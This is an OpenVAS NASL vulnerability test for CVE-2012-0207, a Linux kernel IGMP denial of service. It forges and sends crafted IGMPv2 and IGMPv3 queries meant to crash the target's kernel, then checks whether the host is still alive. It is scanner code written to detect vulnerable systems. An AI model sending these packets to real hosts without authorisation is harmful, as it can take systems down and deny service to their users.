###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_linux_kernel_igmp_dos_vuln.nasl 8649 2018-02-03 12:16:43Z teissa $
#
# Linux Kernel IGMP Remote Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to cause a kernel crash,
  denying service to legitimate users.
  Impact Level: System";
tag_affected = "Linux Kernels above or equal to 2.6.36";
tag_insight = "The flaw is due to an error in IGMP protocol implementation, which
  can be exploited to cause a kernel crash via specially crafted IGMP queries.";
tag_solution = "Upgrade to Linux Kernel version 3.0.17, 3.1.9 or 3.2.1
  For updates refer to http://www.kernel.org";
tag_summary = "This host is running Linux and prone to remote denial of service
  vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802295");
  script_version("$Revision: 8649 $");
  script_bugtraq_id(51343);
  script_cve_id("CVE-2012-0207");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-02-03 13:16:43 +0100 (Sat, 03 Feb 2018) $");
  script_tag(name:"creation_date", value:"2012-01-19 14:14:14 +0530 (Thu, 19 Jan 2012)");
  script_name("Linux Kernel IGMP Remote Denial Of Service Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47472");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18378");
  script_xref(name : "URL" , value : "http://www.securitytracker.com/id/1026526");
  script_xref(name : "URL" , value : "http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=654876");
  script_xref(name : "URL" , value : "http://womble.decadent.org.uk/blog/igmp-denial-of-service-in-linux-cve-2012-0207.html");
  script_xref(name : "URL" , value : "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=a8c1f65c79cbbb2f7da782d4c9d15639a9b94b27");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_exclude_keys("keys/TARGET_IS_IPV6");
  exit(0);
}

if(TARGET_IS_IPV6())exit(0);

## Get Source and Destination Address
dstaddr = get_host_ip();
srcaddr = this_host();

# Ensure that the host is still up
start_denial();
sleep(2);
up = end_denial();

if(!up) {
    exit(0);
}

## Construct Normal IGMPv2 Membership query
ip = forge_ip_packet( ip_v   : 4,
                      ip_hl  : 7,
                      ip_tos : 0,
                      ip_len : 20,
                      ip_off : 0,
                      ip_p   : IPPROTO_IGMP,
                      ip_id  : 18277,
                      ip_ttl : 1,
                      ip_src : srcaddr,
                      ip_dst : dstaddr);

igmp1 = forge_igmp_packet(ip    : ip,
                          type  : 0x11,
                          code  : 0xff,
                          group : 224.0.0.1);

start_denial();

## Send IGMPv2 query
result = send_packet(igmp1, pcap_active:FALSE);

## Construct IGMPv3 query with zero Max Response Time
igmp2 = forge_igmp_packet(ip    : ip,
                          type  : 0x11,
                          code  : 0x00,
                          group : 0.0.0.0,
                          data  : "haha",
                          update_ip_len : FALSE);

## Set IP Elements
igmp2 = set_ip_elements(ip:igmp2, ip_len:28, ip_id:18278);

## Send IGMPv3 query which will trigger a divide by zero error
result = send_packet(igmp2, pcap_active:FALSE);
alive = end_denial();

## Confirm Host is Still Alive and Responding
if(! alive) {
  security_message(port:0);
}
